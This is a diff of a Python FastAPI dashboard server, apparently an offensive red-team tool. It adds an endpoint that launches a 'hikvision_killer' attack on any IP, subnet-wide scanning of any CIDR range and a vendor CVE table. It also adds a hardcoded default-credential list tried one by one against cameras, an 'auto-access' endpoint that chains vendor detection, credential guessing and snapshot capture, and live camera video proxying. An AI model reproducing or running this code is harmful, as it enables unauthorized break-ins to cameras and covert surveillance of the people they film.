@@ -125,14 +125,21 @@ except ImportError:
 
 
 # ── Enhanced Recon Module (ONVIF, SSDP, SNMP, NetBIOS, mDNS) ────────────────
-try:
-    sys.path.insert(0, str(BASE.parent / "backend"))
-    from modules.enhanced_recon import router as enhanced_recon_router
-    _ENHANCED_RECON_OK = True
-    print("[ENHANCED-RECON] Módulo cargado: ONVIF + SSDP + SNMP + NetBIOS + mDNS")
-except Exception as _er_err:
-    _ENHANCED_RECON_OK = False
-    print(f"[WARN] enhanced_recon import falló: {_er_err}", flush=True)
+# Resolver path absoluto: buscar backend/modules/enhanced_recon.py en múltiples ubicaciones
+_ENHANCED_RECON_OK = False
+for _bp in [BASE.parent / "backend", BASE / "backend", SCRIPT_DIR.parent.parent / "backend", Path.cwd() / "backend"]:
+    if (_bp / "modules" / "enhanced_recon.py").exists():
+        sys.path.insert(0, str(_bp))
+        try:
+            from modules.enhanced_recon import router as enhanced_recon_router
+            _ENHANCED_RECON_OK = True
+            print(f"[ENHANCED-RECON] Cargado desde {_bp} — ONVIF + SSDP + SNMP + NetBIOS + mDNS")
+            break
+        except Exception as _er_err:
+            sys.path.pop(0)
+            print(f"[WARN] enhanced_recon import falló desde {_bp}: {_er_err}", flush=True)
+if not _ENHANCED_RECON_OK:
+    print("[WARN] enhanced_recon no encontrado — /api/enhanced/* no disponible", flush=True)
 
 # ── OSINT Advanced v4.0 (Google, Shodan, VirusTotal, Censys, Social) ─────────
 try:
@@ -236,13 +243,133 @@ except Exception as _arto_err:
     _ARTO_OK = False
     print(f"[WARN] ARTO import falló: {_arto_err}", flush=True)
 
+# ── SEAL SUPER PACK — Escaneo, ataque, fingerprinting, orquestación ─────────
+_SEAL_OK = False
+try:
+    from seal.api.seal_api_router import router as seal_router
+    app.include_router(seal_router)
+    _SEAL_OK = True
+    print("[SEAL] Router montado en /api/devices, /api/scan, /api/status (SEAL SUPER PACK)")
+
+    @app.on_event("startup")
+    async def _seal_auto_start():
+        global _SEAL_OK
+        try:
+            from seal.orchestrator.seal_orchestrator import get_orchestrator
+            _orch = get_orchestrator()
+            print("[SEAL] ✅ Orquestador SEAL inicializado")
+        except Exception as _e:
+            print(f"[SEAL] ⚠ No se pudo inicializar orquestador: {_e}")
+
+    @app.on_event("shutdown")
+    async def _seal_auto_stop():
+        try:
+            from seal.orchestrator.seal_orchestrator import get_orchestrator
+            _orch = get_orchestrator()
+            if hasattr(_orch, 'stop'):
+                _orch.stop()
+                print("[SEAL] Orquestador detenido")
+        except Exception:
+            pass
+
+except Exception as _seal_err:
+    _SEAL_OK = False
+    print(f"[WARN] SEAL import falló: {_seal_err}", flush=True)
+
+# ── LEVIATHAN v3.0 — Módulos de Red Team (scanners, exploiters, AI, reporters) ──
+_LEVIATHAN_OK = False
+try:
+    sys.path.insert(0, str(BASE.parent))
+    import leviathan_core
+    from leviathan_core.api.leviathan_router import router as leviathan_router
+    from leviathan_core.api.integration_router import router as leviathan_integration
+    app.include_router(leviathan_router)
+    app.include_router(leviathan_integration)
+    _LEVIATHAN_OK = True
+
+    # Mostrar el banner ASCII de LEVIATHAN (existia en leviathan_core/banner.py
+    # pero nunca se llamaba desde ningun lado — nunca se veia al arrancar)
+    try:
+        leviathan_core.show_banner()
+    except Exception:
+        pass
+
+    print("[LEVIATHAN] Router montado: /api/leviathan/* + /api/v1/* (unified)", flush=True)
+
+    # Auto-inicializar LEVIATHAN al arrancar el servidor (mismo patron que ARTO)
+    # Pre-carga scanners/exploiters/analyzers/reporters en memoria para que el
+    # primer request no pague el costo de import + registro de modulos.
+    @app.on_event("startup")
+    async def _leviathan_auto_start():
+        global _LEVIATHAN_OK
+        try:
+            from leviathan_core.api.leviathan_router import _load_modules as _lev_load
+            _lev_load()
+            print("[LEVIATHAN] ✅ Módulos precargados y listos para operar", flush=True)
+        except Exception as _e:
+            print(f"[LEVIATHAN] ⚠ No se pudieron precargar módulos: {_e}", flush=True)
+            # No desactivamos _LEVIATHAN_OK: el router sigue funcionando,
+            # simplemente cargará los módulos de forma perezosa en el primer request.
+
+except ImportError as _lev_err:
+    import traceback
+    print(f"[WARN] LEVIATHAN import falló (ImportError): {_lev_err}", flush=True)
+    traceback.print_exc()
+    _LEVIATHAN_OK = False
+except Exception as _lev_err:
+    import traceback
+    print(f"[WARN] LEVIATHAN import falló (Exception): {_lev_err}", flush=True)
+    traceback.print_exc()
+    _LEVIATHAN_OK = False
+
+# ── Endpoints de integración ARTO + SEAL ──────────────────────────────────
+@app.get("/api/integrated/health")
+async def integrated_health():
+    """Estado de todos los sistemas integrados (ARTO + SEAL + módulos)"""
+    return {
+        "status": "healthy",
+        "arto": _ARTO_OK,
+        "seal": _SEAL_OK,
+        "leviathan": _LEVIATHAN_OK,
+        "timestamp": str(datetime.now())
+    }
+
+@app.get("/api/integrated/scan")
+async def integrated_scan(network: str = "192.168.1.0/24"):
+    """Escaneo integrado: SEAL detecta dispositivos, ARTO analiza amenazas"""
+    try:
+        from seal.scanners.network_sweep_ultimate import discover_active_ips, scan_target
+        active_ips = await discover_active_ips(network)
+        results = []
+        for ip in active_ips[:20]:
+            try:
+                target_data = await scan_target(ip)
+                if target_data.get('services'):
+                    results.append(target_data)
+            except Exception:
+                pass
+        return {"success": True, "network": network, "scanned": len(active_ips), "targets": results}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/integrated/attack/{ip}")
+async def integrated_attack(ip: str):
+    """Ataque integrado: SEAL explota, ARTO decide la acción"""
+    try:
+        from seal.attackers.hikvision_killer import scan_and_attack
+        result = await scan_and_attack(ip)
+        return {"success": True, "result": result}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
 # ── API Key (obligatoria) ────────────────────────────────────────────────────
 API_KEY_HEADER = APIKeyHeader(name="X-API-Key", auto_error=False)
 
 # Endpoints PÚBLICOS (no requieren API key):
 #   /api/health, /health, /healthz  → health checks
 #   /canary/callback               → intruso phone-home (debe ser accesible)
-PUBLIC_PATHS = {"/api/health", "/health", "/healthz", "/canary/callback", "/api/auth/login", "/api/auth/biometric", "/api/auth/password", "/api/auth/webauthn/status", "/api/auth/webauthn/register/begin", "/api/auth/webauthn/register/finish", "/api/auth/webauthn/auth/begin", "/api/auth/webauthn/auth/finish"}
+PUBLIC_PATHS = {"/api/health", "/health", "/healthz", "/canary/callback", "/api/auth/login", "/api/auth/biometric", "/api/auth/password", "/api/auth/webauthn/status", "/api/auth/webauthn/register/begin", "/api/auth/webauthn/register/finish", "/api/auth/webauthn/auth/begin", "/api/auth/webauthn/auth/finish", "/favicon.ico", "/robots.txt", "/manifest.json"}
 
 # ── CORS lockdown ───────────────────────────────────────────────────────────
 ALLOWED_ORIGINS = [o.strip() for o in os.environ.get("ALLOWED_ORIGINS", "http://localhost:5173,http://127.0.0.1:5173").split(",") if o.strip()]
@@ -292,7 +419,7 @@ app.add_middleware(CORSMiddleware, allow_origins=ALLOWED_ORIGINS, allow_credenti
                    expose_headers=["*"])
 
 # ── Rate limiting (simple, en memoria) ───────────────────────────────────────
-RATE_LIMIT = int(os.environ.get("RATE_LIMIT", "60"))  # requests por minuto por IP
+RATE_LIMIT = int(os.environ.get("RATE_LIMIT", "300"))  # requests por minuto por IP
 _rate_store: dict[str, list[float]] = {}
 
 def _rate_check(client_ip: str) -> bool:
@@ -346,7 +473,7 @@ async def security_middleware(request: Request, call_next):
         return JSONResponse({"error": "Rate limit exceeded"}, status_code=429)
 
     # Health checks y canary callback son públicos
-    if path in PUBLIC_PATHS or path == "/" or path.startswith("/assets/"):
+    if path in PUBLIC_PATHS or path == "/" or path.startswith("/assets/") or path.startswith("/vite/") or path.endswith(".ico") or path.endswith(".png") or path.endswith(".svg") or path.endswith(".webmanifest"):
         return await call_next(request)
 
     # Todo lo demás requiere autenticación. El frontend envía el token emitido
@@ -553,6 +680,8 @@ def _run_terminal(command: str) -> dict:
 # ── Services ──────────────────────────────────────────────────────────────────
 SERVICE_DEFS = {
     "dashboard_server": {"description": "REST API Server (this process)", "cmd": None, "log_file": str(LOGS_DIR / "dashboard.log")},
+    "arto": {"description": "ARTO AI — operaciones autónomas de red team", "cmd": None, "log_file": str(LOGS_DIR / "dashboard.log"), "in_process_flag": "_ARTO_OK"},
+    "leviathan": {"description": "LEVIATHAN v3.0 — scanners, exploiters, AI, reporters", "cmd": None, "log_file": str(LOGS_DIR / "dashboard.log"), "in_process_flag": "_LEVIATHAN_OK"},
     "xdr-correlator": {"description": "XDR Correlator — MITRE ATT&CK correlation engine",
         "cmd": [sys.executable, "-c", f"import sys; sys.path.insert(0,'{ROOT}'); from xdr.correlator import XDREngine; import time; eng=XDREngine(); print('[xdr] ready'); time.sleep(999999)"],
         "log_file": str(LOGS_DIR / "xdr.log")},
@@ -603,6 +732,14 @@ def _svc_status(name: str) -> dict:
         return {"name": name, "status": "running", "pid": os.getpid(),
                 "uptime": _fmt_uptime(_SERVER_START), "lastLogs": _tail_log(name, 5),
                 "description": SERVICE_DEFS[name]["description"]}
+    defn0 = SERVICE_DEFS.get(name, {})
+    if defn0.get("in_process_flag"):
+        # Servicios que viven dentro de este mismo proceso (ARTO, LEVIATHAN):
+        # no son subprocess, reportamos su flag de inicialización real.
+        is_ok = globals().get(defn0["in_process_flag"], False)
+        return {"name": name, "status": "running" if is_ok else "error", "pid": os.getpid() if is_ok else None,
+                "uptime": _fmt_uptime(_SERVER_START) if is_ok else None,
+                "lastLogs": _tail_log(name, 5), "description": defn0["description"]}
     proc = _svc_procs.get(name)
     if proc is None or proc.poll() is not None:
         return {"name": name, "status": "stopped", "pid": None, "uptime": None,
@@ -614,6 +751,9 @@ def _svc_status(name: str) -> dict:
 def _start_service(name: str) -> dict:
     defn = SERVICE_DEFS.get(name)
     if not defn: return {"ok": False, "message": f"Unknown: {name}"}
+    if defn.get("in_process_flag"):
+        is_ok = globals().get(defn["in_process_flag"], False)
+        return {"ok": is_ok, "message": f"{name} corre dentro del proceso principal (in-process)" + ("" if is_ok else " — no se inicializó correctamente, revisa logs")}
     if not defn["cmd"]: return {"ok": True, "message": f"{name} always running"}
     with _svc_lock:
         proc = _svc_procs.get(name)
@@ -625,6 +765,8 @@ def _start_service(name: str) -> dict:
 
 def _stop_service(name: str) -> dict:
     if name == "dashboard_server": return {"ok": False, "message": "Cannot stop self"}
+    if SERVICE_DEFS.get(name, {}).get("in_process_flag"):
+        return {"ok": False, "message": f"{name} corre in-process, no se puede detener sin reiniciar el dashboard"}
     with _svc_lock:
         proc = _svc_procs.get(name)
         if proc is None or proc.poll() is not None: return {"ok": True, "message": f"{name} not running"}
@@ -863,21 +1005,135 @@ def _get_scan_timeout() -> float:
         return 0.5
 
 async def _discover_hosts_tcp(subnet: str) -> list:
-    """Escanea el /24 completo via TCP connect puro. Funciona en Termux
-    sin root, sin depender de raw sockets ni de que nmap tenga privilegios."""
+    """Escanea cualquier red CIDR (/24, /22, /16, etc.) via TCP connect puro.
+    Funciona en Termux sin root. Usa chunking para no saturar la memoria
+    del celular cuando la red es grande (>254 hosts)."""
+    import ipaddress as _ipa
     try:
-        base = subnet.split("/")[0].rsplit(".", 1)[0] + "."
+        net = _ipa.ip_network(subnet, strict=False)
+        all_hosts = [str(h) for h in net.hosts()]
     except Exception:
-        return []
+        # Fallback: asumir /24 con formato viejo
+        try:
+            base = subnet.split("/")[0].rsplit(".", 1)[0] + "."
+        except Exception:
+            return []
+        all_hosts = [f"{base}{i}" for i in range(1, 255)]
+
     ports = _get_scan_ports()
     timeout = _get_scan_timeout()
-    sem = asyncio.Semaphore(64)
-    async def check(i):
-        ip = f"{base}{i}"
+
+    # Chunking: procesar en lotes de 64 hosts para no crear 1000+ tasks
+    # de golpe y saturar la memoria del celular.
+    CHUNK_SIZE = 64
+    MAX_CONCURRENT = 32  # conexiones TCP simultaneas dentro de cada chunk
+    sem = asyncio.Semaphore(MAX_CONCURRENT)
+    alive_hosts = []
+
+    async def check(ip):
         async with sem:
             return ip if await _tcp_host_alive(ip, ports, timeout) else None
-    results = await asyncio.gather(*[check(i) for i in range(1, 255)])
-    return [ip for ip in results if ip]
+
+    for chunk_start in range(0, len(all_hosts), CHUNK_SIZE):
+        chunk = all_hosts[chunk_start:chunk_start + CHUNK_SIZE]
+        results = await asyncio.gather(*[check(ip) for ip in chunk])
+        alive_hosts.extend([ip for ip in results if ip])
+
+    return alive_hosts
+
+
+# ── Escaneo por chunks con streaming SSE para redes grandes ─────────────────
+@app.get("/api/scan/network/stream")
+async def scan_network_stream(subnet: str = ""):
+    """Escaneo de red SSE en vivo. Soporta cualquier CIDR (/24, /22, /16, etc.).
+    Usa chunking automatico para no saturar el celular en redes grandes.
+    Envia resultados parciales via SSE a medida que encuentra hosts."""
+    import ipaddress as _ipa
+
+    if not subnet:
+        ops_subnet = _load_ops().get("scan_subnet", "")
+        if ops_subnet and "/" in ops_subnet:
+            subnet = ops_subnet
+        else:
+            subnet = await asyncio.to_thread(subnet_from_iface)
+
+    try:
+        net = _ipa.ip_network(subnet, strict=False)
+        all_hosts = [str(h) for h in net.hosts()]
+    except Exception:
+        return JSONResponse({"error": f"CIDR inválido: {subnet}"}, status_code=400)
+
+    total = len(all_hosts)
+    ports = _get_scan_ports()
+    timeout = _get_scan_timeout()
+
+    # Chunking adaptativo: 64 hosts por chunk, 32 concurrentes por chunk
+    CHUNK_SIZE = 64
+    MAX_CONCURRENT = 32
+    sem = asyncio.Semaphore(MAX_CONCURRENT)
+
+    async def check(ip):
+        async with sem:
+            return ip if await _tcp_host_alive(ip, ports, timeout) else None
+
+    async def event_stream():
+        scanned = 0
+        found = 0
+        alive_hosts = []
+
+        # Enviar info inicial
+        yield f"data: {json.dumps({'type': 'start', 'subnet': subnet, 'total': total})}\n\n"
+
+        for chunk_start in range(0, total, CHUNK_SIZE):
+            chunk = all_hosts[chunk_start:chunk_start + CHUNK_SIZE]
+            results = await asyncio.gather(*[check(ip) for ip in chunk])
+            chunk_alive = [ip for ip in results if ip]
+
+            for ip in chunk_alive:
+                alive_hosts.append(ip)
+                found += 1
+                yield f"data: {json.dumps({'type': 'host', 'ip': ip, 'found': found})}\n\n"
+
+            scanned += len(chunk)
+            progress = min(100, int(scanned * 100 / total))
+            yield f"data: {json.dumps({'type': 'progress', 'scanned': scanned, 'total': total, 'progress': progress, 'found': found})}\n\n"
+
+            # Broadcast por WebSocket tambien
+            await broadcast({"type": "scan_progress", "scanned": scanned, "total": total, "found": found})
+
+        # Fingerprint de hosts encontrados (en paralelo, sin bloquear)
+        if alive_hosts:
+            fp_sem = asyncio.Semaphore(16)
+            async def fp_safe(ip):
+                async with fp_sem:
+                    return await _fingerprint_host(ip)
+            fp_results = await asyncio.gather(*[fp_safe(ip) for ip in alive_hosts])
+
+            hosts_data = []
+            for ip, fp in zip(alive_hosts, fp_results):
+                host = {
+                    "ip": ip,
+                    "type": fp["type"],
+                    "ports": [
+                        {"port": p, "service": SERVICE_NAMES.get(p, "unknown"),
+                         "state": "open", "banner": (fp["banners"].get(p) or "")[:80]}
+                        for p in fp["ports"]
+                    ],
+                    "risk": fp["risk"],
+                    "risk_reasons": fp["risk_reasons"],
+                    "vendor": fp.get("vendor"),
+                    "status": "up"
+                }
+                hosts_data.append(host)
+                yield f"data: {json.dumps({'type': 'host_detail', 'host': host})}\n\n"
+
+            yield f"data: {json.dumps({'type': 'complete', 'found': found, 'total': total, 'hosts': hosts_data})}\n\n"
+        else:
+            yield f"data: {json.dumps({'type': 'complete', 'found': 0, 'total': total, 'hosts': []})}\n\n"
+
+        await broadcast({"type": "scan_complete", "found": found, "total": total})
+
+    return StreamingResponse(event_stream(), media_type="text/event-stream")
 
 @app.get("/api/network/info")
 async def network_info():
@@ -891,14 +1147,22 @@ async def network_info():
             "local_hostname": socket.gethostname() if hasattr(socket, "gethostname") else ""}
 
 @app.post("/api/scan/topology")
-async def scan_topology():
-    # Si el usuario configuro una subred manual en Settings, usarla
-    ops_subnet = _load_ops().get("scan_subnet", "")
-    if ops_subnet and "/" in ops_subnet:
-        subnet = ops_subnet
-    else:
-        subnet = await asyncio.to_thread(subnet_from_iface)
-    ok, out = await _nmap_or_empty(["nmap", "-sn", "-T4", "-n", "--max-retries", "1", subnet], timeout=90)
+async def scan_topology(subnet: str = ""):
+    # Subnet como parametro query, o de Settings, o auto-detectada
+    if not subnet:
+        ops_subnet = _load_ops().get("scan_subnet", "")
+        if ops_subnet and "/" in ops_subnet:
+            subnet = ops_subnet
+        else:
+            subnet = await asyncio.to_thread(subnet_from_iface)
+    # nmap con timeout adaptativo: mas hosts = mas timeout
+    import ipaddress as _ipa
+    try:
+        net_size = len(list(_ipa.ip_network(subnet, strict=False).hosts()))
+        nmap_timeout = min(300, max(90, net_size // 5))
+    except Exception:
+        nmap_timeout = 90
+    ok, out = await _nmap_or_empty(["nmap", "-sn", "-T4", "-n", "--max-retries", "1", subnet], timeout=nmap_timeout)
     hosts, current = [], None
     nmap_note = None
     if not ok:
@@ -1070,24 +1334,32 @@ async def iot_scan_network(body: dict = Body(...)):
     except Exception:
         return JSONResponse({"error": f"CIDR inválido: {cidr}"}, status_code=400)
     
-    hosts = [str(h) for h in net.hosts()][:254]  # limitar a /24
+    hosts = [str(h) for h in net.hosts()]
     # Escanear puertos de cámara + comunes
     SCAN_PORTS = [554, 80, 443, 8080, 8000, 37777, 8554, 23, 22]
     
     cameras = []
     all_devices = []
     
-    # Escaneo paralelo por IP
+    # Chunking para redes grandes: 64 hosts por lote, 32 concurrentes
+    CHUNK_SIZE = 64
+    IOT_SEM = asyncio.Semaphore(32)
+    
     async def scan_ip(ip: str):
         results = {}
         for port in SCAN_PORTS:
-            b = await tcp_check(ip, port, timeout=1.0)
+            async with IOT_SEM:
+                b = await tcp_check(ip, port, timeout=1.0)
             if b is not None:
                 results[port] = b[:80]
         return ip, results
     
-    tasks = [scan_ip(ip) for ip in hosts]
-    scan_results = await asyncio.gather(*tasks)
+    scan_results = []
+    for chunk_start in range(0, len(hosts), CHUNK_SIZE):
+        chunk = hosts[chunk_start:chunk_start + CHUNK_SIZE]
+        tasks = [scan_ip(ip) for ip in chunk]
+        chunk_results = await asyncio.gather(*tasks)
+        scan_results.extend(chunk_results)
     
     for ip, ports in scan_results:
         if not ports:
@@ -1162,26 +1434,468 @@ async def iot_video_urls(ip: str = Query(...), port: int = Query(80)):
     return {"ip": ip, "video_sources": sources, "total": len(sources)}
 
 @app.get("/api/iot/snapshot")
-async def iot_snapshot(ip: str = Query(...), port: int = Query(80), path: str = Query("/snapshot.cgi")):
-    try:
-        scheme = "https" if port in (443, 8443) else "http"
-        url = f"{scheme}://{ip}:{port}{urllib.parse.unquote(path)}"
-        ctx = None
-        if scheme == "https":
-            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-        req = urllib.request.Request(url, headers={"User-Agent": "SourceSeal-Snapshot/3.0"})
-        opener = urllib.request.build_opener(
-            urllib.request.HTTPSHandler(context=ctx) if scheme == "https" else urllib.request.HTTPHandler())
-        with opener.open(req, timeout=5) as resp:
-            data = resp.read()
-            ct = resp.headers.get("Content-Type", "image/jpeg")
-            return Response(content=data, media_type=ct)
-    except Exception as e:
-        return JSONResponse({"error": str(e)[:200]}, status_code=502)
+async def iot_snapshot(ip: str = Query(...), port: int = Query(80), path: str = Query("/snapshot.cgi"),
+                       user: str = Query(""), pwd: str = Query("")):
+    """Fetch snapshot from camera. Tries auth if provided, falls back to common paths."""
+    import httpx
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{ip}:{port}"
+    auth = None
+    if user or pwd:
+        auth = (user or "", pwd or "")
+
+    # Paths de snapshot comunes por vendor (en orden de probabilidad)
+    snapshot_paths = [
+        path,  # El path proporcionado
+        "/snapshot.cgi",
+        "/cgi-bin/snapshot.cgi",
+        "/image/jpeg.cgi",
+        "/cgi-bin/viewer/video.jpg",
+        "/tmpfs/auto.jpg",
+        "/ISAPI/Streaming/channels/101/picture",
+        "/onvif/snapshot",
+        "/mjpg/snapshot.cgi",
+        "/cgi-bin/view/snapshot.cgi",
+        "/snapshot.jpg",
+    ]
+    # Elimar duplicados manteniendo orden
+    seen = set()
+    snapshot_paths = [p for p in snapshot_paths if not (p in seen or seen.add(p))]
+
+    verify = False if scheme == "https" else True
+    async with httpx.AsyncClient(timeout=8, verify=verify) as c:
+        for snap_path in snapshot_paths:
+            try:
+                url = base_url + snap_path
+                r = await c.get(url, auth=auth, follow_redirects=True,
+                                headers={"User-Agent": "SourceSeal-Snapshot/3.1"})
+                ct = r.headers.get("Content-Type", "")
+                # Aceptar cualquier content-type que sea imagen o octet-stream
+                if r.status_code == 200 and ("image" in ct or "octet-stream" in ct or len(r.content) > 1000):
+                    return Response(content=r.content, media_type=ct or "image/jpeg")
+            except Exception:
+                continue
+
+    return JSONResponse({"error": "Snapshot no disponible (prueba con credenciales)", "tried": len(snapshot_paths)}, status_code=502)
 
 @app.get("/api/iot/stream")
-async def iot_stream(ip: str = Query(...), port: int = Query(80), path: str = Query("/mjpg/video.mjpg")):
-    return JSONResponse({"error": "MJPEG streaming requires a browser-facing proxy. Use the snapshot endpoint.", "ip": ip}, status_code=501)
+async def iot_stream(ip: str = Query(...), port: int = Query(80), path: str = Query("/mjpg/video.mjpg"),
+                     user: str = Query(""), pwd: str = Query("")):
+    """Proxy MJPEG stream from camera to browser — allows live video in <img> tag."""
+    import httpx
+    scheme = "https" if port in (443, 8443) else "http"
+    url = f"{scheme}://{ip}:{port}{urllib.parse.unquote(path)}"
+    auth = None
+    if user or pwd:
+        auth = (user or "", pwd or "")
+
+    async def generate():
+        try:
+            timeout = httpx.StreamTimeout(read=15, connect=5, write=5, pool=5)
+            verify = False if scheme == "https" else True
+            async with httpx.AsyncClient(timeout=timeout, verify=verify) as c:
+                async with c.stream("GET", url, auth=auth, follow_redirects=True,
+                                    headers={"User-Agent": "SourceSeal-Stream/3.1"}) as r:
+                    if r.status_code != 200:
+                        yield f'--boundary\r\nContent-Type: application/json\r\n\r\n{{"error": "HTTP {r.status_code}"}}\r\n'
+                        return
+                    async for chunk in r.aiter_bytes():
+                        yield chunk
+        except Exception as e:
+            yield f'--boundary\r\nContent-Type: application/json\r\n\r\n{{"error": "{str(e)[:100]}"}}\r\n'
+
+    return StreamingResponse(generate(), media_type="multipart/x-mixed-replace; boundary=--boundary")
+
+# ── IoT Vendor Detection + CVE DB + Default Creds ─────────────────────────────
+VENDOR_CVES = {
+    "Hikvision": [
+        {"cve": "CVE-2021-36260", "desc": "RCE via SDK webLanguage", "severity": "critical", "port": 80},
+        {"cve": "CVE-2021-33044", "desc": "Auth bypass", "severity": "critical", "port": 80},
+        {"cve": "CVE-2017-7921", "desc": "Auth bypass via backdoor user", "severity": "critical", "port": 80},
+    ],
+    "Dahua": [
+        {"cve": "CVE-2021-33045", "desc": "RCE via RPC", "severity": "critical", "port": 80},
+        {"cve": "CVE-2020-25078", "desc": "Auth bypass", "severity": "high", "port": 80},
+        {"cve": "CVE-2022-30560", "desc": "Auth bypass via crafted request", "severity": "critical", "port": 37777},
+    ],
+    "Xiongmai": [
+        {"cve": "CVE-2017-17215", "desc": "Unauthenticated RCE", "severity": "critical", "port": 9530},
+        {"cve": "CVE-2017-8225", "desc": "Auth bypass", "severity": "critical", "port": 80},
+    ],
+    "D-Link": [
+        {"cve": "CVE-2019-16920", "desc": "RCE without auth", "severity": "critical", "port": 80},
+        {"cve": "CVE-2020-25078", "desc": "Creds leak via CGI", "severity": "high", "port": 80},
+    ],
+    "Netgear": [
+        {"cve": "CVE-2016-6277", "desc": "RCE via CGI", "severity": "critical", "port": 80},
+    ],
+    "GoAhead": [
+        {"cve": "CVE-2017-8225", "desc": "Auth bypass", "severity": "critical", "port": 80},
+    ],
+    "Ubiquiti": [
+        {"cve": "CVE-2021-35064", "desc": "Unauthenticated access", "severity": "high", "port": 80},
+    ],
+}
+
+RTSP_PATHS_BY_VENDOR = {
+    "Hikvision": ["/Streaming/Channels/101", "/Streaming/Channels/102", "/h264/ch1/main/av_stream"],
+    "Dahua": ["/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1"],
+    "Xiongmai": ["/h264", "/H.264", "/live/ch0", "/live/ch1"],
+    "Generic": ["/live", "/stream1", "/videoMain", "/cam", "/mjpg/video.mjpg"],
+    "ONVIF": ["/onvif/source", "/Media/Streaming/Channel/1"],
+}
+
+DEFAULT_CREDS = [
+    ("admin", "admin"), ("admin", "12345"), ("admin", "123456"), ("admin", ""),
+    ("admin", "password"), ("admin", "admin123"), ("admin", "54321"),
+    ("root", "root"), ("root", "admin"), ("root", "12345"), ("root", "pass"),
+    ("user", "user"), ("user", "12345"), ("guest", "guest"), ("guest", ""),
+    ("administrator", "admin"), ("ubnt", "ubnt"), ("supervisor", "supervisor"),
+    ("service", "service"), ("operator", "operator"), ("maintain", "maintain"),
+    ("admin", "888888"), ("admin", "666666"), ("admin", "111111"),
+]
+
+def _identify_camera_vendor(ip: str, port: int) -> str:
+    """Identifica el fabricante de la cámara por HTTP banner y paths."""
+    import httpx
+    try:
+        scheme = "https" if port in (443, 8443) else "http"
+        url = f"{scheme}://{ip}:{port}/"
+        r = httpx.get(url, timeout=5, follow_redirects=True, verify=False,
+                      headers={"User-Agent": "SourceSeal-Recon/3.1"})
+        body_lower = r.text[:5000].lower()
+        server = r.headers.get("Server", "").lower()
+
+        if "hikvision" in server or "dvr" in server and "hik" in body_lower:
+            return "Hikvision"
+        if "dahua" in server or "dvr" in server and "dahua" in body_lower:
+            return "Dahua"
+        if "d-link" in server or "dlink" in server:
+            return "D-Link"
+        if "netgear" in server:
+            return "Netgear"
+        if "ubiquiti" in server or "ubnt" in server:
+            return "Ubiquiti"
+        if "goahead" in server:
+            return "GoAhead"
+        if "ISAPI" in r.text or "doc/page/login.asp" in r.text:
+            return "Hikvision"
+        if "current_config" in r.text or "login_login" in r.text:
+            return "Dahua"
+        if "xiongmai" in body_lower or "net_suitor" in body_lower or "/hdl" in body_lower:
+            return "Xiongmai"
+        if "onvif" in body_lower:
+            return "ONVIF"
+        return "unknown"
+    except Exception:
+        return "unknown"
+
+@app.get("/api/iot/vulns")
+async def iot_vulns(ip: str = Query(...), port: int = Query(80)):
+    """Identifica el vendor, devuelve CVEs conocidos, prueba credenciales por defecto."""
+    vendor = _identify_camera_vendor(ip, port)
+    cves = VENDOR_CVES.get(vendor, [])
+    rtsp_paths = RTSP_PATHS_BY_VENDOR.get(vendor, RTSP_PATHS_BY_VENDOR["Generic"])
+
+    creds_found = None
+    if vendor != "unknown":
+        import httpx
+        scheme = "https" if port in (443, 8443) else "http"
+        base_url = f"{scheme}://{ip}:{port}"
+        async with httpx.AsyncClient(timeout=5, verify=False) as c:
+            for user, pwd in DEFAULT_CREDS:
+                try:
+                    r = await c.get(base_url + "/", auth=(user, pwd), follow_redirects=True)
+                    if r.status_code == 200 and len(r.content) > 500:
+                        if "401" not in r.text[:200] and "unauthorized" not in r.text[:200].lower():
+                            creds_found = {"user": user, "pwd": pwd}
+                            break
+                except Exception:
+                    continue
+
+    snap_url = f"/api/iot/snapshot?ip={ip}&port={port}"
+    if creds_found:
+        snap_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+    stream_url = f"/api/iot/stream?ip={ip}&port={port}&path={rtsp_paths[0]}" if rtsp_paths else ""
+
+    return {
+        "ip": ip, "port": port,
+        "vendor": vendor,
+        "cves": cves,
+        "rtsp_paths": rtsp_paths,
+        "default_creds_tested": len(DEFAULT_CREDS) if vendor != "unknown" else 0,
+        "creds_found": creds_found,
+        "snapshot_url": snap_url,
+        "stream_url": stream_url,
+    }
+
+@app.get("/api/iot/auto-access")
+async def iot_auto_access(ip: str = Query(...), port: int = Query(80)):
+    """Orquestación automática: vendor → CVEs → creds → snapshot → stream.
+    Un solo endpoint que ejecuta todo el flujo contextual."""
+    import httpx
+
+    # 1. Detectar vendor
+    vendor = _identify_camera_vendor(ip, port)
+    cves = VENDOR_CVES.get(vendor, [])
+    rtsp_paths = RTSP_PATHS_BY_VENDOR.get(vendor, RTSP_PATHS_BY_VENDOR["Generic"])
+
+    # 2. Probar credenciales por defecto
+    creds_found = None
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{ip}:{port}"
+
+    async with httpx.AsyncClient(timeout=8, verify=False) as c:
+        if vendor != "unknown":
+            for user, pwd in DEFAULT_CREDS:
+                try:
+                    r = await c.get(base_url + "/", auth=(user, pwd), follow_redirects=True)
+                    if r.status_code == 200 and len(r.content) > 500:
+                        if "401" not in r.text[:200] and "unauthorized" not in r.text[:200].lower():
+                            creds_found = {"user": user, "pwd": pwd}
+                            break
+                except Exception:
+                    continue
+
+        # 3. Intentar snapshot (con o sin creds)
+        snapshot_ok = False
+        snapshot_path_used = None
+        snapshot_size = 0
+
+        snap_paths = [
+            "/snapshot.cgi", "/cgi-bin/snapshot.cgi", "/image/jpeg.cgi",
+            "/cgi-bin/viewer/video.jpg", "/tmpfs/auto.jpg",
+            "/ISAPI/Streaming/channels/101/picture", "/onvif/snapshot",
+            "/mjpg/snapshot.cgi", "/cgi-bin/view/snapshot.cgi", "/snapshot.jpg",
+        ]
+        auth = (creds_found["user"], creds_found["pwd"]) if creds_found else None
+
+        for snap_path in snap_paths:
+            try:
+                url = base_url + snap_path
+                r = await c.get(url, auth=auth, follow_redirects=True,
+                                headers={"User-Agent": "SourceSeal-AutoAccess/3.1"})
+                ct = r.headers.get("Content-Type", "")
+                if r.status_code == 200 and ("image" in ct or "octet-stream" in ct or len(r.content) > 1000):
+                    snapshot_ok = True
+                    snapshot_path_used = snap_path
+                    snapshot_size = len(r.content)
+                    break
+            except Exception:
+                continue
+
